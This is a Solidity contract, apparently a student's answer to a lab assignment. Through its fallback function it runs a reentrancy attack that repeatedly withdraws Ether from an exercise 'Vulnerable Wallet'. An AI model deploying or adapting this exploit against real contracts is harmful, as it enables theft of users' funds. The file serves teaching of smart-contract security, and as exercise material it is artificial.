// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface WalletI{
    // This is the interface of the wallet to be attacked. 
    function deposit() external payable;
    function sendTo(address payable dest) external;
}

contract WalletAttack{
    // A contract used to attack the Vulnerable Wallet.
        WalletI victim;
        uint private took;
        address payable private owner;

   constructor() {
        // The constructor for the attacking contract.
        // Do not change the signature
        took = 0;
        owner = payable(msg.sender);
    }

    function exploit(WalletI _target) public payable{
        // runs the exploit on the target wallet.
        // you should not deposit more than 1 Ether to the vulnerable wallet.
        // Assuming the target wallet has more than 3 Ether in deposits,
        // you should withdraw at least 3 Ether from the wallet.
        victim = _target;
        _target.deposit{value: msg.value}();
        _target.sendTo(payable(address(this)));
    }

    fallback() external payable{
        if (took <= 3) {
            took += 1;
            victim.sendTo(payable(address(this)));
            }
    }

    // you may add addtional functions and state variables as needed. 
}